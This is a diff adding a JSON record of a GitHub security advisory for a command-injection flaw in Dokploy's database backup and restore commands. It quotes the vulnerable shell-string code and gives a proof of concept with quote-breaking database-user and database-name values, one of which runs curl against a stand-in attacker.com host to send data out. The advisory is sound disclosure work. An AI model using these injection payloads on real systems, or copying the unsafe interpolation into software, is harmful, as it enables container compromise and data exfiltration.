@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-qc73-mp78-4833",
+  "repo": {
+    "cve_id": "CVE-2026-72881",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\n\nDatabase backup and restore commands interpolate user-controlled database credentials (username, password, database name) directly into shell command strings passed to `child_process.exec()`. An attacker can inject arbitrary OS commands through database configuration fields.\n\n### Details\n\nIn `packages/server/src/utils/backups/utils.ts`, backup commands are constructed by interpolating user-controlled values inside single-quoted strings:\n\n```typescript\n// utils.ts:84 - Postgres backup\nreturn `docker exec -i $CONTAINER_ID bash -c \"set -o pipefail; pg_dump -Fc --no-acl --no-owner -h localhost -U ${databaseUser} --no-password '${database}' | gzip\"`;\n\n// utils.ts:92 - MariaDB backup  \nreturn `docker exec -i $CONTAINER_ID bash -c \"set -o pipefail; mariadb-dump --user='${databaseUser}' --password='${databasePassword}' --single-transaction --quick --databases ${database} | gzip\"`;\n\n// utils.ts:99 - MySQL backup\nreturn `docker exec -i $CONTAINER_ID bash -c \"set -o pipefail; mysqldump --default-character-set=utf8mb4 -u 'root' --password='${databasePassword}' --single-transaction --no-tablespaces --quick '${database}' | gzip\"`;\n```\n\nSingle-quote escaping is trivially bypassable: a value containing `'` breaks out of the single-quoted context.\n\nThe same pattern exists in restore commands:\n- `packages/server/src/utils/restore/postgres.ts`\n- `packages/server/src/utils/restore/mysql.ts`\n- `packages/server/src/utils/restore/mariadb.ts`\n- `packages/server/src/utils/restore/mongo.ts`\n\n### PoC\n\n1. Create a database (e.g., PostgreSQL) in Dokploy\n2. Set the database user to: `postgres' && curl http://attacker.com/$(whoami) && echo '`\n3. Or set the database name to: `mydb' | gzip; id > /tmp/pwned; echo '`\n4. Trigger a backup\n5. The injected command executes inside the database container via `docker exec`\n\nThe resulting command becomes:\n```bash\ndocker exec -i $CONTAINER_ID bash -c \"set -o pipefail; pg_dump -Fc --no-acl --no-owner -h localhost -U postgres' && curl http://attacker.com/$(whoami) && echo ' --no-password 'mydb' | gzip\"\n```\n\n### Impact\n\n- **Container compromise**: Arbitrary command execution inside database containers\n- **Data exfiltration**: Full database dump to attacker-controlled server\n- **Credential theft**: Access to database credentials and data\n- **Container escape potential**: If the database container has elevated privileges\n\nThis requires authenticated access with permission to create databases and configure backups.\n\nDiscovered by: security-bot (automated security research toolkit)",
+    "ghsa_id": "GHSA-qc73-mp78-4833",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-qc73-mp78-4833",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-qc73-mp78-4833"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72881"
+      }
+    ],
+    "published_at": "2026-07-21T23:26:14Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via database credentials in backup/restore commands",
+    "updated_at": "2026-08-10T19:20:09Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 0.0.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
